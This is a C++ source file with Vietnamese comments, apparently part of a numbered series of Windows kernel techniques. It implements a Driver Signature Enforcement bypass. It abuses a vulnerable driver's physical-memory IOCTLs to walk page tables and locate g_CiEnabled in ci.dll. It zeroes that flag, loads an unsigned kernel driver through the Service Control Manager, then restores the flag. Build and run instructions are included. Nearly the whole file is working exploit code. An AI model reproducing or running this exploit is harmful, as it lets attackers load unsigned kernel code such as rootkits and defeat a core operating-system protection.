/*
 * 4_dse_bypass.cpp — Tắt Driver Signature Enforcement, load unsigned driver
 *
 * Ý tưởng:
 *   DSE (Driver Signature Enforcement) được kiểm soát bởi biến ci!g_CiEnabled
 *   trong ci.dll (Code Integrity). Khi g_CiEnabled == 0, kernel không kiểm tra
 *   chữ ký số của driver khi load.
 *
 *   Ta tìm g_CiEnabled bằng cách:
 *   1. Load disk image của ci.dll (LoadLibraryEx DONT_RESOLVE_DLL_REFERENCES)
 *   2. Tìm hàm CiInitialize (export của ci.dll)
 *   3. Scan bytecode trong CiInitialize để tìm instruction:
 *      MOV [RIP+disp32], reg32   (opcode 0x89, ModRM & 0xC7 == 0x05)
 *      → instruction này gán giá trị vào g_CiEnabled khi CI init
 *   4. Tính RVA của g_CiEnabled từ disp32 + RIP
 *   5. Cộng với kernel base của ci.dll → VA trong kernel → PA qua virt_to_phys
 *   6. Ghi 0 → DSE tắt → load driver → ghi lại giá trị gốc
 *
 * Lưu ý:
 *   - Window DSE=off rất ngắn: chỉ trong lúc sc start → minimize thời gian
 *   - Driver phải đã tồn tại trên disk trước khi chạy
 *   - Không cần token swap — admin quyền đủ cho SCM
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:4_dse_bypass.exe 4_dse_bypass.cpp ^
 *      /link /subsystem:console kernel32.lib advapi32.lib ntdll.lib
 *
 * Chạy (Administrator):
 *   4_dse_bypass.exe [path_to_driver.sys]
 *   4_dse_bypass.exe   (dùng default path bên dưới)
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winioctl.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_MAP_PHYS  0x80002008u
#define IOCTL_READ_MSR  0x800020ECu
#define DEVICE_PATH     "\\\\.\\Astra32Device0"
#define IA32_LSTAR      0xC0000082u
#define KUSD_VA         0xFFFFF78000000000ULL

#define DEFAULT_DRV_PATH  "C:\\Users\\kuvee\\source\\repos\\Driver11\\x64\\Release\\Driver11.sys"
#define DEFAULT_DRV_SVC   "Driver11"

static bool is_kptr(uint64_t v) { return v > 0xFFFF800000000000ULL && v < 0xFFFFFFFFFFFFFFF0ULL; }

#pragma pack(push,1)
struct MAP_INPUT { uint32_t interface_type, bus_number; uint64_t physical_addr; uint32_t address_space, size; };
#pragma pack(pop)

struct Astra {
    HANDLE dev = INVALID_HANDLE_VALUE; uint64_t hint_hi = 0;
    bool open() {
        dev = CreateFileA(DEVICE_PATH, GENERIC_READ|GENERIC_WRITE,
                          FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (dev == INVALID_HANDLE_VALUE) printf("[-] Cannot open %s: %lu\n", DEVICE_PATH, GetLastError());
        return dev != INVALID_HANDLE_VALUE;
    }
    void close() { if (dev != INVALID_HANDLE_VALUE) { CloseHandle(dev); dev = INVALID_HANDLE_VALUE; } }
    bool read_msr(uint32_t idx, uint64_t *out) {
        uint8_t io[8] = {}; memcpy(io, &idx, 4); DWORD ret = 0;
        if (!DeviceIoControl(dev, IOCTL_READ_MSR, io, 4, io, 8, &ret, NULL)) return false;
        memcpy(out, io, 8); return true;
    }
    uintptr_t map_page(uint64_t phys_page) {
        MAP_INPUT inp = {}; inp.physical_addr = phys_page; inp.size = 0x1000;
        DWORD ret = 0;
        if (!DeviceIoControl(dev, IOCTL_MAP_PHYS, &inp, sizeof(inp), &inp, sizeof(inp), &ret, NULL)) return 0;
        uint64_t lo = (uint64_t)(uint32_t)inp.interface_type; if (!lo) return 0;
        auto try_hi = [&](uint64_t hi) -> uintptr_t {
            uint64_t cand = (hi << 32) | lo; MEMORY_BASIC_INFORMATION mbi;
            return (VirtualQuery((LPCVOID)cand, &mbi, sizeof(mbi)) > 0 && mbi.State == MEM_COMMIT) ? (uintptr_t)cand : 0;
        };
        if (auto va = try_hi(hint_hi)) return va;
        for (uint64_t hi = 0; hi < 0x8000; hi++) { if (hi == hint_hi) continue; if (auto va = try_hi(hi)) { hint_hi = hi; return va; } }
        return 0;
    }
    void unmap(uintptr_t va) { UnmapViewOfFile((LPCVOID)(va & ~(uintptr_t)0xFFF)); }
    static bool safe_copy(uintptr_t src, void *dst, size_t n) { SIZE_T rd = 0; return ReadProcessMemory(GetCurrentProcess(), (LPCVOID)src, dst, n, &rd) && rd == n; }
    bool read_phys(uint64_t addr, void *buf, size_t len) {
        auto *dst = (uint8_t *)buf;
        for (size_t pos = 0; pos < len; ) {
            uint64_t page = addr & ~(uint64_t)0xFFF; size_t off = (size_t)(addr & 0xFFF), chunk = std::min(len-pos, (size_t)(0x1000-off));
            uintptr_t va = map_page(page); if (!va) return false;
            bool ok = safe_copy(va+off, dst+pos, chunk); unmap(va); if (!ok) return false;
            pos += chunk; addr += chunk;
        }
        return true;
    }
    bool write_phys(uint64_t addr, const void *buf, size_t len) {
        auto *src = (const uint8_t *)buf;
        for (size_t pos = 0; pos < len; ) {
            uint64_t page = addr & ~(uint64_t)0xFFF; size_t off = (size_t)(addr & 0xFFF), chunk = std::min(len-pos, (size_t)(0x1000-off));
            uintptr_t va = map_page(page); if (!va) return false;
            memcpy((void*)(va+off), src+pos, chunk); unmap(va); pos += chunk; addr += chunk;
        }
        return true;
    }
    bool read_u32(uint64_t pa, uint32_t *v) { return read_phys(pa, v, 4); }
    bool read_u64(uint64_t pa, uint64_t *v) { return read_phys(pa, v, 8); }
    bool write_u32(uint64_t pa, uint32_t v) { return write_phys(pa, &v, 4); }
};

// ─── Page table walk ─────────────────────────────────────────────────────────
static bool virt_to_phys(Astra *d, uint64_t cr3, uint64_t va, uint64_t *pa) {
    auto idx = [&](int lvl) { return (va >> (12 + lvl*9)) & 0x1FF; };
    uint64_t e = 0;
    if (!d->read_u64((cr3 & 0x000FFFFFFFFFF000ULL) + idx(3)*8, &e) || !(e&1)) return false;
    if (!d->read_u64((e   & 0x000FFFFFFFFFF000ULL) + idx(2)*8, &e) || !(e&1)) return false;
    if (e & 0x80) { *pa = (e & 0x000FFFFC0000000ULL) | (va & 0x3FFFFFFFULL); return true; }
    if (!d->read_u64((e   & 0x000FFFFFFFFFF000ULL) + idx(1)*8, &e) || !(e&1)) return false;
    if (e & 0x80) { *pa = (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL); return true; }
    if (!d->read_u64((e   & 0x000FFFFFFFFFF000ULL) + idx(0)*8, &e) || !(e&1)) return false;
    *pa = (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL); return true;
}
static bool vread(Astra *d, uint64_t cr3, uint64_t va, void *buf, size_t len) {
    auto *dst = (uint8_t *)buf;
    for (size_t pos = 0; pos < len; ) {
        size_t off = (size_t)(va & 0xFFF), chunk = std::min(len-pos, (size_t)(0x1000-off));
        uint64_t pa; if (!virt_to_phys(d, cr3, va, &pa)) return false;
        if (!d->read_phys(pa, dst+pos, chunk)) return false; pos += chunk; va += chunk;
    }
    return true;
}

static uint64_t find_cr3(Astra *d) {
    const uint64_t idx = (KUSD_VA >> 39) & 0x1FF;
    printf("[*] Scanning low 64 MB for CR3...\n");
    std::vector<uint64_t> cands;
    for (uint64_t pg = 0; pg < 0x4000000ULL; pg += 0x1000) {
        uint64_t e = 0; if (!d->read_u64(pg+idx*8, &e) || !(e&1)) continue;
        if ((e & 0x000FFFFFFFFFF000ULL) > 0x80000000ULL) continue; cands.push_back(pg);
    }
    printf("[*] %zu candidates, verifying...\n", cands.size());
    for (uint64_t cr3 : cands) {
        uint64_t pa; uint32_t v = 0;
        if (virt_to_phys(d, cr3, KUSD_VA, &pa) && d->read_u32(pa+0x26C, &v) && v == 10) return cr3;
    }
    return 0;
}

static uintptr_t load_image(const char *n) { return (uintptr_t)LoadLibraryExA(n, NULL, DONT_RESOLVE_DLL_REFERENCES); }
static uint64_t export_rva(uintptr_t base, const char *name) {
    FARPROC p = GetProcAddress((HMODULE)base, name); return p ? (uint64_t)((uintptr_t)p - base) : 0;
}

// ════════════════════════════════════════════════════════════
//   NtQuerySystemInformation(11) → danh sách kernel modules
//   Dùng để tìm kernel base address của ci.dll
// ════════════════════════════════════════════════════════════
typedef NTSTATUS (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);
struct RTL_MOD { PVOID Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize, Flags; USHORT LoadOrderIdx,InitOrderIdx,LoadCount,NameOffset; CHAR FullName[256]; };
struct RTL_MODS { ULONG Count; RTL_MOD Mods[1]; };

static RTL_MODS *get_kernel_modules() {
    auto NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return NULL;
    ULONG sz = 0x10000; RTL_MODS *buf = NULL; NTSTATUS st;
    do { free(buf); buf = (RTL_MODS *)malloc(sz); if (!buf) return NULL;
         st = NtQSI(11, buf, sz, &sz);
    } while (st == (NTSTATUS)0xC0000004L);
    if (st) { free(buf); return NULL; }
    return buf;
}
static uint64_t get_module_kbase(RTL_MODS *mods, const char *name) {
    for (ULONG i = 0; i < mods->Count; i++) {
        const char *fn = mods->Mods[i].FullName + mods->Mods[i].NameOffset;
        if (_stricmp(fn, name) == 0) return (uint64_t)(uintptr_t)mods->Mods[i].ImageBase;
    }
    return 0;
}

// ════════════════════════════════════════════════════════════
//   Pattern scan trong CiInitialize để tìm g_CiEnabled
//
//   Target instruction (x64 RIP-relative MOV):
//     89 /r mod=00 rm=101   →   MOV [RIP + disp32], r32
//   Opcode = 0x89
//   ModRM:  mod=00 (2 bit cao), rm=101 (3 bit thấp) → & 0xC7 == 0x05
//   Sau đó 4 byte = signed disp32
//   Target VA = VA_of_next_instruction + disp32
//             = (ci_kbase + instr_rva + 6) + disp32
// ════════════════════════════════════════════════════════════
static uint64_t find_g_ci_enabled_rva(uintptr_t ci_disk) {
    uint64_t fn_rva = export_rva(ci_disk, "CiInitialize");
    if (!fn_rva) { printf("[-] CiInitialize not found in ci.dll\n"); return 0; }
    printf("[*] CiInitialize RVA = 0x%llX\n", (unsigned long long)fn_rva);

    auto *fn = (const uint8_t *)(ci_disk + fn_rva);
    for (size_t i = 0; i < 0x2000 - 6; i++) {
        if (fn[i] != 0x89) continue;           // MOV opcode
        if ((fn[i+1] & 0xC7) != 0x05) continue; // ModRM: mod=00, rm=101

        int32_t disp; memcpy(&disp, fn+i+2, 4);
        uint64_t instr_rva  = fn_rva + i;
        uint64_t target_rva = (uint64_t)((int64_t)(instr_rva + 6) + disp);

        // Loại bỏ địa chỉ trông như code, giữ lại vùng data
        if (target_rva < 0x8000 || target_rva > 0x300000) continue;

        uint8_t disk_val = *(uint8_t *)(ci_disk + target_rva);
        printf("[*] Candidate +0x%04zX: MOV [RIP+0x%X] (reg=%d) → RVA=0x%llX  disk_val=%u\n",
               i, (uint32_t)disp, (fn[i+1]>>3)&7,
               (unsigned long long)target_rva, disk_val);
        return target_rva;  // lấy candidate đầu tiên hợp lệ
    }
    printf("[-] g_CiEnabled pattern not found\n");
    return 0;
}

// ════════════════════════════════════════════════════════════
//   Đăng ký và start driver qua SCM
// ════════════════════════════════════════════════════════════
static bool load_driver(const char *svc_name, const char *sys_path) {
    SC_HANDLE mgr = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!mgr) { printf("[-] OpenSCManager: %lu\n", GetLastError()); return false; }
    // Xóa service cũ nếu tồn tại
    SC_HANDLE s = OpenServiceA(mgr, svc_name, SERVICE_ALL_ACCESS);
    if (s) { DeleteService(s); CloseServiceHandle(s); }
    s = CreateServiceA(mgr, svc_name, svc_name, SERVICE_ALL_ACCESS,
                       SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                       sys_path, NULL, NULL, NULL, NULL, NULL);
    if (!s) { printf("[-] CreateService: %lu\n", GetLastError()); CloseServiceHandle(mgr); return false; }
    BOOL ok = StartService(s, 0, NULL);
    DWORD err = GetLastError();
    CloseServiceHandle(s); CloseServiceHandle(mgr);
    if (!ok && err != ERROR_SERVICE_ALREADY_RUNNING) {
        printf("[-] StartService: %lu\n", err); return false;
    }
    return true;
}

// ════════════════════════════════════════════════════════════
//   main
// ════════════════════════════════════════════════════════════
int main(int argc, char **argv) {
    const char *drv_path = (argc >= 2) ? argv[1] : DEFAULT_DRV_PATH;
    const char *drv_svc  = DEFAULT_DRV_SVC;

    printf("\n=== Technique 4: DSE Bypass + Load Driver ===\n");
    printf("[*] Driver: %s\n", drv_path);
    printf("[*] Service: %s\n\n", drv_svc);

    // Kiểm tra file tồn tại
    if (GetFileAttributesA(drv_path) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] Driver file not found: %s\n", drv_path); return 1;
    }

    // DSE bypass chỉ cần device + CR3 (không cần EPROCESS)
    Astra drv; if (!drv.open()) return 1;
    printf("[+] ASTRA64 device opened\n");

    uint64_t cr3 = find_cr3(&drv);
    if (!cr3) { printf("[-] CR3 not found\n"); return 1; }
    printf("[+] CR3 = 0x%llX\n", (unsigned long long)cr3);

    // Lấy kernel base của ci.dll từ NtQuerySystemInformation
    RTL_MODS *mods = get_kernel_modules();
    if (!mods) { printf("[-] NtQuerySystemInformation failed\n"); return 1; }
    uint64_t ci_kbase = get_module_kbase(mods, "ci.dll");
    free(mods);
    if (!ci_kbase) { printf("[-] ci.dll not in module list\n"); return 1; }
    printf("[+] ci.dll kernel base = 0x%llX\n", (unsigned long long)ci_kbase);

    // Load disk image của ci.dll để scan
    uintptr_t ci_disk = load_image("ci.dll");
    if (!ci_disk) { printf("[-] LoadLibraryEx ci.dll: %lu\n", GetLastError()); return 1; }
    printf("[+] ci.dll disk image loaded\n");

    // Pattern scan CiInitialize → tìm g_CiEnabled RVA
    uint64_t gci_rva = find_g_ci_enabled_rva(ci_disk);
    if (!gci_rva) return 1;

    uint64_t gci_va = ci_kbase + gci_rva;
    printf("[+] g_CiEnabled VA = 0x%llX\n", (unsigned long long)gci_va);

    // Translate VA → PA
    uint64_t gci_pa = 0;
    if (!virt_to_phys(&drv, cr3, gci_va, &gci_pa)) {
        printf("[-] virt_to_phys(g_CiEnabled) failed\n"); return 1;
    }
    printf("[+] g_CiEnabled PA = 0x%llX\n", (unsigned long long)gci_pa);

    // Đọc giá trị hiện tại
    uint32_t orig_val = 0; drv.read_u32(gci_pa, &orig_val);
    printf("[+] g_CiEnabled = %u (DSE %s)\n", orig_val, orig_val ? "ENABLED" : "already disabled");

    // ── DISABLE DSE ──
    printf("[*] Writing 0 → g_CiEnabled...\n");
    drv.write_u32(gci_pa, 0);
    uint32_t check = 0; drv.read_u32(gci_pa, &check);
    printf("[+] g_CiEnabled = %u (DSE %s)\n", check, check ? "STILL ON (write failed?)" : "DISABLED");
    if (check != 0) { printf("[-] Write did not take effect\n"); return 1; }

    // ── LOAD DRIVER ──
    printf("[*] Loading %s...\n", drv_path);
    bool loaded = load_driver(drv_svc, drv_path);

    // ── RESTORE DSE ── (ngay lập tức, dù load thành công hay không)
    drv.write_u32(gci_pa, orig_val);
    drv.read_u32(gci_pa, &check);
    printf("[+] g_CiEnabled = %u (DSE %s)\n", check, check ? "RESTORED" : "still 0?");

    if (loaded) {
        printf("\n[+] SUCCESS! Driver '%s' is running.\n", drv_svc);
        printf("    Stop:  sc stop %s\n", drv_svc);
        printf("    Clean: sc stop %s && sc delete %s\n", drv_svc, drv_svc);
    } else {
        printf("\n[-] Driver load failed. DSE was restored — no harm done.\n");
    }

    drv.close();
    return loaded ? 0 : 1;
}
